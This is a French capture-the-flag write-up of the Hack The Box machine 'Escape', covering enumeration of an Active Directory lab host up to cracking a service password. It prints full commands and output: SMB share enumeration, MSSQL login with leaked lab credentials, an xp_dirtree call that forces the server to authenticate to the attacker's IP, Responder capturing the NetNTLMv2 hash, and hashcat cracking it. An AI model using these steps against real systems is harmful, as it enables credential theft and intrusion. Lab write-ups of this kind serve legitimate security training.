## Description
Escape est une machine Windows Active Directory de difficulté Medium qui démarre avec un partage SMB qui permet aux utilisateurs authentifiés invités de télécharger un fichier PDF sensible. Dans le fichier PDF, des informations d'identification temporaires sont disponibles pour accéder à un service MSSQL fonctionnant sur la machine. Un attaquant est en mesure de forcer le service MSSQL à s'authentifier sur sa machine et de capturer le hachage. Il s'avère que le service s'exécute sous un compte d'utilisateur et que le hachage est cassable. Disposant d'un ensemble d'informations d'identification valides, un attaquant est en mesure d'obtenir l'exécution de commandes sur la machine à l'aide de WinRM. En énumérant la machine, un fichier journal révèle les informations d'identification de l'utilisateur `ryan.cooper`. Une énumération plus poussée de la machine révèle qu'une autorité de certification est présente et qu'un modèle de certificat est vulnérable à l'attaque `ESC1`, ce qui signifie que les utilisateurs qui peuvent utiliser ce modèle peuvent demander des certificats pour n'importe quel autre utilisateur du domaine, y compris les administrateurs de domaine. Ainsi, en exploitant la vulnérabilité `ESC1`, un attaquant est en mesure d'obtenir un certificat valide pour le compte Administrateur et de l'utiliser pour obtenir le hash de l'utilisateur Administrateur.< 

## Recon
Pour commencer je lance mon outil `nmapauto`
```terminal

###############################################
###---------) Starting Quick Scan (---------###
###############################################

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 20:11 CST
Initiating Ping Scan at 20:11
Scanning 10.129.228.253 [4 ports]
Completed Ping Scan at 20:11, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:11
Completed Parallel DNS resolution of 1 host. at 20:11, 0.02s elapsed
Initiating SYN Stealth Scan at 20:11
Scanning 10.129.228.253 [1000 ports]
Discovered open port 135/tcp on 10.129.228.253
Discovered open port 139/tcp on 10.129.228.253
Discovered open port 445/tcp on 10.129.228.253
Discovered open port 53/tcp on 10.129.228.253
Discovered open port 389/tcp on 10.129.228.253
Discovered open port 88/tcp on 10.129.228.253
Discovered open port 593/tcp on 10.129.228.253
Discovered open port 1433/tcp on 10.129.228.253
Discovered open port 3269/tcp on 10.129.228.253
Discovered open port 464/tcp on 10.129.228.253
Discovered open port 636/tcp on 10.129.228.253
Discovered open port 3268/tcp on 10.129.228.253
Completed SYN Stealth Scan at 20:11, 20.61s elapsed (1000 total ports)
Nmap scan report for 10.129.228.253
Host is up (0.28s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Open Ports : 53,88,135,139,389,445,464,593,636,1433,3268,3269                                                                                                

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-28 20:11 CST
NSE: Loaded 46 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 20:11
Completed Parallel DNS resolution of 1 host. at 20:11, 0.00s elapsed
Initiating SYN Stealth Scan at 20:11
Scanning 10.129.228.253 [65535 ports]
Discovered open port 135/tcp on 10.129.228.253
Discovered open port 445/tcp on 10.129.228.253
Discovered open port 53/tcp on 10.129.228.253
Discovered open port 139/tcp on 10.129.228.253
Discovered open port 9389/tcp on 10.129.228.253
Discovered open port 3268/tcp on 10.129.228.253
SYN Stealth Scan Timing: About 34.44% done; ETC: 20:12 (0:00:59 remaining)
Discovered open port 5985/tcp on 10.129.228.253
Discovered open port 1433/tcp on 10.129.228.253
Discovered open port 464/tcp on 10.129.228.253
Discovered open port 57390/tcp on 10.129.228.253
Discovered open port 636/tcp on 10.129.228.253
Discovered open port 49717/tcp on 10.129.228.253
Discovered open port 593/tcp on 10.129.228.253
Discovered open port 389/tcp on 10.129.228.253
SYN Stealth Scan Timing: About 68.77% done; ETC: 20:13 (0:00:41 remaining)
Discovered open port 49690/tcp on 10.129.228.253
Discovered open port 49713/tcp on 10.129.228.253
Discovered open port 3269/tcp on 10.129.228.253
Discovered open port 88/tcp on 10.129.228.253
Host is up (0.29s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-29 10:13:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
57390/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Open Ports : 53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49713,49717,57390                                                  
```

Ici avec mon nmap je trouve que le domain est `sequel.htb`

- DNS ouvert
- Kerberoas ouvert au port `88`
- SMB ouvert (139 & 445)
- MSSQL ouvert au port 1433
- MSRPC au port 135
- WINRM au port 5985

```
└─# echo "$ip  $host $host2" | tee -a /etc/hosts
10.129.228.253  sequel.htb DC.sequel.htb
```

**Deeper Scan**
Un second scan pour avoir plus d'infos toujours
```
└─# nmap -sCV -Pn -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49713,49717,57390 $ip   
Nmap scan report for sequel.htb (10.129.228.253)
Host is up (0.45s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-29 10:21:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-29T10:22:41+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-29T10:22:39+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-02-29T10:22:40+00:00; +7h59m59s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-02-29T10:07:39
|_Not valid after:  2054-02-28T10:07:39
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-29T10:22:41+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-02-29T10:22:39+00:00; +7h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
57390/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-02-29T10:22:01
|_  start_date: N/A
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
```

**SMB**
Pour debuter mon Pentest je debute toujours avec `netexec` ou `crackmapexec` pour voir s'il ya des sessions anonymous et des `shares` accessible
```
└─# nxc smb $ip -u '' -p '' --shares                                                                                  
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\: 
SMB         10.129.228.253  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
Ici, les utilisateurs `anonyme` sont autorisee mais ils n'affiche pas les `shares`
- Une methodes que j'ai appris recement c'est de mettre un nom quelconque dans le `-u `

```
└─# nxc smb $ip -u 'notrealuser' -p '' --shares
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\notrealuser: 
SMB         10.129.228.253  445    DC               [*] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share 
```

On a des shares avec des privilege de lire. mais d'abord voyons le `MSRPC` si nous pouvons enumerer des utilisateurs

**MSRPC**
```
└─# rpcclient -N -U '' $ip         
rpcclient $> enumdomains
result was NT_STATUS_ACCESS_DENIED
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $> 
```

No ca marche pas alors continuons et lisons les `shares`
```
└─# smbclient -N //sequel.htb/IPC$          
Try "help" to get a list of possible commands.
smb: \> dir'
dir': command not found
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> 

└─# smbclient -N //sequel.htb/Public
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 05:51:25 2022
  ..                                  D        0  Sat Nov 19 05:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 07:39:43 2022

                5184255 blocks of size 4096. 1467041 blocks available
smb: \> 
```
Dans le 2eme `shares` je trouve un PDF. telechargeons le
```
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (8.5 KiloBytes/sec) (average 8.5 KiloBytes/sec)
smb: \> 
```

Je vois un long texte dans ce pdf mais donc reperons les utilisateurs
*For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user `PublicUser` and password `GuestUserCantWrite1` .*

- j'ai trouver un user et un password
- J'ai aussi trouver plusieurs utilisateurs dans ce pdf

Alors quoi faire?
- D'abord je vais faire un `kerbrute` avec ces users que j'ai pu trouver(Aucun user n'est valides)
- Alors utilisons le username et le mot de passe dans `netexec`

```
└─# nxc smb $ip -u 'PublicUser' -p 'GuestUserCantWrite1'
SMB         10.129.228.253  445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1 
```

On a un utilisateur valides. Essayons le `MSRPC`
```
└─# rpcclient -U 'PublicUser' $ip 
Password for [WORKGROUP\PublicUser]:
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 2F A2 4C BB 67 D8 32 3D   49 20 13 2B C1 3B B8 73   /.L.g.2= I .+.;.s
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```
Ca ne marche pas.
- Bon, alors comme j'ai un user et un mot de passe et si je l'essayais dans le `mssql` avec `impacket`

```
─# impacket-mssqlclient sequel.htb/publicuser:GuestUserCantWrite1@10.129.228.253
Impacket v0.12.0.dev1+20231114.165227.4b56c18a - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> 
```

Dans le `mssql` ca marche tres bien, Donc pour continuer on a besoin de :

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

## Steal NetNTLM hash / Relay attack
Dans la description on nous dit qu'on peux forcer le `mssql` a se connecter a notre machine ensuite de capture le `hash`

```
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.5\anything\yh
subdirectory   depth   file   
------------   -----   ----   
SQL (PublicUser  guest@master)>

```
ensuite j'ouvre un `responder`
```
└─# responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
[+] Listening for events...                                                                  

[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:d47167e5e5b219a3:8F3DF57CCC7B5D7EB7666A0DBD09D29D:010100000000000080FE2C0D886ADA0146BF2C592825CC6A0000000002000800520035005500410001001E00570049004E002D004E004900490046004B004A004C003400490031004D0004003400570049004E002D004E004900490046004B004A004C003400490031004D002E0052003500550041002E004C004F00430041004C000300140052003500550041002E004C004F00430041004C000500140052003500550041002E004C004F00430041004C000700080080FE2C0D886ADA01060004000200000008003000300000000000000000000000003000003396D999AB019855FF5D352A6808F8734ABCB8DAA7F62CECCBDE3B594EE5E44A0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0035000000000000000000  

```
Je viens de capturer le `NTLMv2-SSP` de l'utilisateur `sql_svc`
- Maintenant on doit le cracker
- https://infinitelogins.com/2020/04/16/abusing-llmnr-nbtns-part-2-cracking-ntlmv2-hashes/

```
─# hashcat -a 0 -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
SQL_SVC::sequel:d47167e5e5b219a3:8f3df57ccc7b5d7eb7666a0dbd09d29d:010100000000000080fe2c0d886ada0146bf2c592825cc6a0000000002000800520035005500410001001e00570049004e002d004e004900490046004b004a004c003400490031004d0004003400570049004e002d004e004900490046004b004a004c003400490031004d002e0052003500550041002e004c004f00430041004c000300140052003500550041002e004c004f00430041004c000500140052003500550041002e004c004f00430041004c000700080080fe2c0d886ada01060004000200000008003000300000000000000000000000003000003396d999ab019855ff5d352a6808f8734abcb8daa7f62ceccbde3b594ee5e44a0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0035000000000000000000:REGGIE1234ronnie
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQL_SVC::sequel:d47167e5e5b219a3:8f3df57ccc7b5d7eb7...000000
Time.Started.....: Wed Feb 28 20:58:39 2024 (6 secs)
Time.Estimated...: Wed Feb 28 20:58:45 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2062.3 kH/s (1.49ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10702848/14344387 (74.61%)
Rejected.........: 0/10702848 (0.00%)
Restore.Point....: 10698752/14344387 (74.58%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: REPITALU -> RBRB67RB
Hardware.Mon.#1..: Temp: 43c Util: 68%

Started: Wed Feb 28 20:58:24 2024
Stopped: Wed Feb 28 20:58:47 2024
```